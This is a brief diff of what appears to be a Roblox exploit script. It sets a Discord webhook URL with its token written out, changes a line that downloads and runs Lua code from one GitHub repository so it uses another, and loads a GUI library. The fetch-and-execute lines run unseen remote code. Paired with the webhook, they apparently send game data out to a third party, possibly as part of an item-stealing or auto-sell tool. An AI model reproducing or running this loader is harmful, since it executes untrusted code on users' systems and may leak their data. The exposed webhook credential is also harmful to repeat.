@@ -1,5 +1,5 @@
 getgenv().Webhook = "https://discord.com/api/webhooks/1217498672086909058/eJ8l3L1KNlX89s0GmQqdBkruuHUGJqwpZF8_DA4E-cJiRY6UaLnpETVdwIaOmQJ7hqb2"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Pukhet/HALOO/main/DriveWorld_Sell.txt", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/79jgjkoo/Yes/main/Hee", true))()
 wait(.1)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/x3fall3nangel/mercury-lib-edit/master/src.lua"))()
 local GUI = Library:Create{
